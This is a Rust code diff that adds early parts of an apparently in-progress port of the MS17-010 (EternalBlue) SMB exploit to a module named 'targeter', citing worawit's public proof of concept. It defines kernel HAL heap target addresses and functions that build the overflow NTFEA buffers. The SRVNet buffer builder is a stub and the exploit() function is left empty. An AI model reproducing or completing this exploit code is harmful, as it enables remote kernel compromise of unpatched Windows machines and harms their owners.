@@ -67,6 +67,9 @@ pub mod smblib {
             }
         }
     }
+
+
+    
 }
 
 
@@ -89,7 +92,12 @@ pub mod targeter {
     /// missing higher-latency machines 
     static PING_FREQ: f32 = 0.2;
 
-
+    /// MS17-010 definitions
+    static NTFEA_SIZE: u32 = 0x11000; // defines mem size for srvnet.sys to allocate in kernel?
+    static TARGET_HAL_HEAP_ADDR_x64: u64 = 0xffffffffffd00010;
+    static TARGET_HAL_HEAP_ADDR_x86:u32 = 0xffdff000;
+    
+    
     #[derive(Debug)]
     pub enum NetError {NoNet, NoValIP, IpDown, ResourceBusy}
 
@@ -127,6 +135,72 @@ pub mod targeter {
 
 
             Ok(ip)
+        }
+
+        /// builds the exploitable buffer used for our offset/ntfea_size
+        fn build_ntfea11000() -> Vec<u8> {
+            let mut buff: Vec<u8> = Vec::with_capacity(
+                                600*5 // beginning zeroes (pack('<BBH',0,0,0)+'\x00')*600)
+                                + 4 // address offset presumably
+                                + 0xf3bd // space to fill up page with debug "we have gone too far" stuff
+                            );
+
+            // initialize with zeroes
+            for _ in 0..600*5 {
+                buff.push(0); 
+            }
+
+            // put address and stuff in there
+            buff.push(0);
+            buff.push(0);
+            buff.push(0xbd); // NOTE TO SELF: IF IT BREAKS ITS PROBS BECAUSE THIS  
+            buff.push(0xf3); // IS NOT PERFECTLY LITTLE ENDIAN
+
+
+            // fill with 'A's for debugging/buffering
+            for _ in 0..0xf3be {
+                buff.push('A' as u8);
+            }
+
+            // return buffer
+            buff
+        }
+
+        /// builds ntfea buffer for 0x1f000 page size
+        fn build_ntfea1f000() -> Vec<u8> {
+            let mut buff: Vec<u8> = Vec::with_capacity(
+                        0x2494*5 // beginning zeroes (pack('<BBH',0,0,0)+'\x00')*0x2494)
+                        + 4 // address offset presumably
+                        + 0x48ee // space to fill up page with debug "we have gone too far" stuff
+                    );
+                
+            // initialize with zeroes
+            for _ in 0..0x2494*5 {
+                buff.push(0); 
+            }
+
+            // put address and stuff in there
+            buff.push(0);
+            buff.push(0);
+            buff.push(0xed); // NOTE TO SELF: IF IT BREAKS ITS PROBS BECAUSE THIS  
+            buff.push(0x48); // IS NOT PERFECTLY LITTLE ENDIAN
+
+
+            // fill with 'A's for debugging/buffering
+            for _ in 0..0x48ee {
+                buff.push('A' as u8);
+            }
+
+            // return buffer
+            buff
+        }
+
+        /// builds the faked SRVNet Buffer
+        fn build_srvnetbuff() -> Vec<u8> {
+            let mut buff: Vec<u8> = Vec::with_capacity(1);
+
+            buff
+
         }
 
 
@@ -239,6 +313,13 @@ pub mod targeter {
             self.determine_ips()?;
 
             Ok(0)
+        }
+
+        /// Actual Rust implementation of MS17-010, based off of POC by worawit
+        /// Link: https://github.com/worawit/MS17-010/blob/master/eternalblue_exploit7.py
+        pub fn exploit(ip: ipaddress::IPAddress){
+
+        
         }
     }
 }
